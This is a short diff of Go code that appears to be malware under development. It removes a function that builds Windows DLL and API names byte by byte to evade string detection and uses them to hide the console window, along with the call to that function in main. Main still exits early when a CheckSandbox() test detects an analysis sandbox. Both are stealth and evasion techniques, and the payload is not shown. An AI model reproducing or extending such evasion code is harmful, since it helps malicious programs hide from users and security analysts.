@@ -190,24 +190,7 @@ func zzzh() {
 }
 
 
-func HME()int{
-    hwnd,_,_ := 	syscall.MustLoadDLL(string([]byte{
-		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
-	})).MustFindProc(string([]byte{
-		'G', 'e', 't', 'C', 'o', 'n', 's', 'o', 'l', 'e', 'W', 'i', 'n', 'd', 'o', 'w',
-	})).Call()
-    if hwnd != 0 {
-        syscall.MustLoadDLL(string([]byte{
-		'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l',
-	})).MustFindProc(string([]byte{
-		'S', 'h', 'o', 'w', 'W', 'i', 'n', 'd', 'o', 'w', 'A', 's', 'y', 'n', 'c',
-	})).Call(hwnd,0)
-    }
-    return 0
-}
-
 func main() {
-	HME()
 
     if CheckSandbox() {
         return 
